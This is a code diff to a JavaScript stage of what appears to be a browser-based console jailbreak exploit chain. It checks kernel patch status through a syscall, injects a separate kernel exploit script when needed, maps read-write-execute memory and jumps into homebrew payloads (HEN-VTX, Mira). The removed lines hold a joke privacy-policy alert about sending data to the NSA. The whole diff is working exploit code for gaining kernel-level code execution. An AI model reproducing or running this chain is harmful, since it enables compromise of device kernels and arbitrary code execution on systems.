@@ -523,54 +523,15 @@ window.stage2_ = function () {
 
   // Test if the kernel is already patched
   var test = p.syscall("sys_setuid", 0);
-  //alert(p.syscall("sys_is_development_mode", 0, 0, 0));
-  if (test != '0')
-    while (!kernExploit()) {}
+  if (test != '0') {
+    // alert("Kernel not patched, run kernel exploit");
+    sc = document.createElement("script");
+    sc.src = "kernel.js";
+    document.body.appendChild(sc);
+  } else {
+    //alert("Kernel patched, launch cool stuff");
 	
-    // Kernel patched, launch cool stuff
-
-    // Check mira status
-    var testMira = p.syscall("sys_setlogin", p.stringify("root"))
-    if('0' != '0') {
-      alert("We've updated our privacy policy in accordance with GDPR. Your trust is important to us, and we're commited to being transparent exploit developers. Press OK to begin data transfer to NSA.")
-
-      var code_addr = new int64(0x26100000, 0x00000009);
-      var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
-
-      // Load HEN-VTX
-      if (buffer == '926100000') {
-        writeHomebrewEN(p, code_addr.add32(0x100000));
-      }
-
-      // Launch HEN-VTX
-      p.fcall(code_addr);
-
-      // Zero
-      for(var i = 0; i < 0x300000; i += 8)
-      {
-        p.write8(code_addr.add32(i), 0);
-      }
-
-      // Load Mira
-      if (buffer == '926100000') {
-        writeMira(p, code_addr.add32(0x100000));
-      }
-
-      // Launch Mira
-      p.fcall(code_addr);
-
-      // Test if payloads ran successfully, if not, refresh
-      testMira = p.syscall("sys_setlogin", p.stringify("root"))
-
-      if(testMira != '0')
-      {
-        location.reload();
-      }
-
-      // All done all done!
-      allset();
-    } else {
-      var code_addr = new int64(0x26100000, 0x00000009);
+		var code_addr = new int64(0x26100000, 0x00000009);
 		var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
 
 		// Load HEN-VTX
@@ -582,5 +543,5 @@ window.stage2_ = function () {
 		p.fcall(code_addr);
 		
 		allset();
-    }
+	}
 }
